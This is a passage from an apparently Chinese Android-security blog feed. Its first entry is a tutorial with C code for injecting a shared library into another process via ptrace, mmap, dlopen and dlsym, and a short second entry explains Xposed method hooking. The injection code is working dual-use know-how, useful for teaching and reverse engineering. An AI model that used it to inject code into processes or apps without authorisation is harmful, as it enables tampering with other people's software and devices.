class="title">ptrace_retval</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__arm__)    </span></span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_r0;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)    </span></span><br><span class="line">    <span class="keyword">return</span> regs-&gt;eax;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Not supported"</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将我们的Shellcode写入到目标进程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace_writedata(target_pid, map_base, library_path, <span class="built_in">strlen</span>(library_path) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h1 id="6、执行Shellcode"><a href="#6、执行Shellcode" class="headerlink" title="6、执行Shellcode"></a>6、执行Shellcode</h1><p>构建dlopen的执行参数，打开shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parameters[<span class="number">0</span>] = map_base;       </span><br><span class="line">parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"dlopen"</span>, dlopen_addr, parameters, <span class="number">2</span>, &amp;regs) == <span class="number">-1</span>)  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到shellcode的句柄，找到shellcode中目标方法的偏移地址，执行dlsym加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * sohandle = ptrace_retval(&amp;regs); </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_NAME_ADDR_OFFSET       0x100    </span></span><br><span class="line">    ptrace_writedata(target_pid, map_base + FUNCTION_NAME_ADDR_OFFSET, function_name, <span class="built_in">strlen</span>(function_name) + <span class="number">1</span>);    </span><br><span class="line">    parameters[<span class="number">0</span>] = sohandle;       </span><br><span class="line">    parameters[<span class="number">1</span>] = map_base + FUNCTION_NAME_ADDR_OFFSET;     </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"dlsym"</span>, dlsym_addr, parameters, <span class="number">2</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * hook_entry_addr = ptrace_retval(&amp;regs);    </span><br><span class="line">    DEBUG_PRINT(<span class="string">"hook_entry_addr = %p\n"</span>, hook_entry_addr);    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_PARAM_ADDR_OFFSET      0x200    </span></span><br><span class="line">    ptrace_writedata(target_pid, map_base + FUNCTION_PARAM_ADDR_OFFSET, param, <span class="built_in">strlen</span>(param) + <span class="number">1</span>);    </span><br><span class="line">    parameters[<span class="number">0</span>] = map_base + FUNCTION_PARAM_ADDR_OFFSET;      </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"hook_entry"</span>, hook_entry_addr, parameters, <span class="number">1</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br></pre></td></tr></table></figure><h1 id="7、恢复原so的状态，detach"><a href="#7、恢复原so的状态，detach" class="headerlink" title="7、恢复原so的状态，detach"></a>7、恢复原so的状态，detach</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Press enter to dlclose and detach\n"</span>);    </span><br><span class="line">getchar();    </span><br><span class="line">parameters[<span class="number">0</span>] = sohandle;       </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"dlclose"</span>, dlclose, parameters, <span class="number">1</span>, &amp;regs) == <span class="number">-1</span>)    </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/* restore */</span>    </span><br><span class="line">ptrace_setregs(target_pid, &amp;original_regs);    </span><br><span class="line">ptrace_detach(target_pid);    </span><br><span class="line">ret = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_detach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_detach"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结，撒花</p><hr><p><strong>参考链接：</strong></p><p><a href="https://blog.csdn.net/ginray/article/details/60628251" target="_blank" rel="noopener">Ptrace 详解:https://blog.csdn.net/ginray/article/details/60628251</a></p><p><a href="https://blog.csdn.net/u012417380/article/details/60470075" target="_blank" rel="noopener">Linux Ptrace 详解: https://blog.csdn.net/u012417380/article/details/60470075</a></p><p>本文代码来自网络，地址没找到了，注释自己写的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;so注入的主要思路是：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;找到目标进程&lt;/li&gt;
&lt;li&gt;使用ptrace跟踪目标进程，保存目标进程的状态&lt;/li&gt;
&lt;li&gt;获得mmap、dlopen、dlsym等库函数在目标进程中的偏移地址&lt;/li&gt;
&lt;li&gt;调用mmap在目标进程内部申请一段内存空间&lt;/li&gt;
&lt;li&gt;将我们的ShellCode写入到刚才申请的内存空间中&lt;/li&gt;
&lt;li&gt;dlopen打开Shellcode，dlsym调用Shellcode库的函数&lt;/li&gt;
&lt;li&gt;恢复原so状态，detach&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Xposed</title>
    <link href="http://imlzq.com/2018/01/08/Xposed/"/>
    <id>http://imlzq.com/2018/01/08/Xposed/</id>
    <published>2018-01-07T16:00:00.000Z</published>
    <updated>2018-04-13T08:41:45.180Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Xposed的表现形式：</strong></p><p>可以拦截任意应用的任意方法实现，将它替换为自设的功能代码。</p><p><strong>主要逻辑：</strong></p><ul><li>通过包名匹配查看是否有需要hook的模块。如果有，修改它的java方法为本地方法（通过修改accessFlag实现）</li><li>当目标方法被调用时，由xposed方法的本地方法调度逻辑分发，回调java层的方法，一般就是各个hook模块，从而实现使用自行实现的方法替换原方法。</li></ul><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Xposed的表现形式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以拦截任意应用的任意方法实现，将它替换为自设的功能代码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要逻辑：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过包名匹配查看是否有需要hook的模块。如果有，修改它的java方法为本地方法（通过修改accessFlag实现）&lt;/li&gt;
&lt;li&gt;当目标方法被调用时，由xposed方法的本地方法调度逻辑分发，回调java层的方法，一般就是各个hook模块，从而实现使用自行实现的方法替换原方法。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
</feed>
